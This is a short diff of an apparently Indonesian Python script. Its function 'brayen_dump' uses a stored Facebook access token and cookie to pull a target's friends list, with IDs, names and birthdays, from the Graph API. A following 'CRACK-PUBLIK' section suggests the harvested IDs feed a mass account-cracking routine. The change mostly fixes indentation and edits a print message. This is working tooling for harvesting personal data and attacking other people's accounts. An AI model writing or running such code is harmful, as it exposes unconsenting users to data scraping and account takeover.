@@ -664,17 +664,17 @@ def result():
 def brayen_dump():
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
-	    a = input('╰─  masukan id target: ')
-	    try:
-		    params = {
-			"access_token": token,
+		a = input('╰─  masukan id target: ')
+		try:
+			params = {
+			"access_token": token, 
 			"fields": "name,friends.fields(id,name,birthday)"
 			}
-		    b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-		    for c in b["friends"]["data"]:
-			    id.append(c["id"]+"|"+c["name"])
-		print(' [+] Total ID Yang Terkumpul : {}'.format(len(id)));setting()
-	except Exception as e:
+			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+			for c in b["friends"]["data"]:
+				id.append(c["id"]+"|"+c["name"])
+			print(' 🔥 : {}'.format(len(id)));setting()
+		except Exception as e:
 		    print (e)
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
